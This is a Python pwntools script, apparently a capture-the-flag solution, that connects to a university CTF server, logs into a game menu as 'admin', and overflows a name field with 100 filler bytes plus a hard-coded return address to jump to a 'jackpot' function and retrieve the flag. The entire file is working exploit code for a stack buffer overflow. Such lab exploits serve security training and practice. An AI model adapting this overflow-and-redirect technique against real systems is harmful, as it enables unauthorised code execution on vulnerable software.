#!/bin/python3.11

import random
from pwn import *

#elf = ELF('./bin')

# S = process('./bin')
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9996)
pointer = 0xffffc7ac
token = b""
for i in range(10):
    random_letter = chr(ord('A') + random.randint(0, 25))
    token += random_letter.encode('utf-8')

buffer = b"A" * 100 + p32(0x8048fa1)
jackpot = 0x8048fa1

print(S.recvuntil(b"Token id: "))
S.sendline(token)
print(S.recvuntil(b"name: "))
S. sendline(b"admin")
print(S.recvuntil(b"ts] ->  "))
S.sendline(b"1")
print(S.recvuntil(b"nd 20: "))
S.sendline(b"1")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"n")


print(S.recvuntil(b"ts] ->  "))
S.sendline(b"5")
print(S.recvuntil(b" name: "))
S.sendline(buffer)


print(S.recvuntil(b"ts] ->  "))
S.sendline(b"1")
print("\n\n")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))

S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))


S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))
S.sendline(b"s")
print(S.recvuntil(b"again? (y/n)  "))

S.sendline(b"n")
print(S.recvuntil(b"ts] ->  "))
S.sendline(b"7")
print(S.recvuntil(b" your flag.\n"))
print(S.recvuntil(b"\n"))
